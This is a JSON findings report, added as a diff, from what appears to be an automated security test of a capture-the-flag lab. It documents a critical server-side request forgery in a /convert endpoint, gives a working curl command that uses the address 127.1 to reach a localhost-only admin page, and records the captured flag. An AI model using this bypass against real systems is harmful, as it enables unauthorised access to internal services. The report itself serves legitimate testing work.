@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:36:05.851815+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "8f7b98fc-6e87-42e2-a3f3-d1f1ac754477",
+      "timestamp": "2026-04-14T15:36:05.851695+00:00",
+      "title": "SSRF Bypass of Localhost-Restricted Admin Interface",
+      "severity": "critical",
+      "target": "http://172.17.0.1:34137",
+      "description": "The /convert endpoint accepts a URL parameter and fetches its content server-side, enabling Server-Side Request Forgery (SSRF). This was exploited to bypass the localhost-only restriction on the /admin interface by using the IP address 127.1 (which resolves to 127.0.0.1). The admin interface at /admin/flag was accessed via SSRF, revealing the CTF flag.",
+      "evidence": "flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}",
+      "tool_used": "curl",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "curl http://172.17.0.1:34137/convert -X POST -d \"url=http://127.1/admin/flag\"",
+        "expected": "Response contains flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}"
+      }
+    }
+  ],
+  "diagrams": []
+}
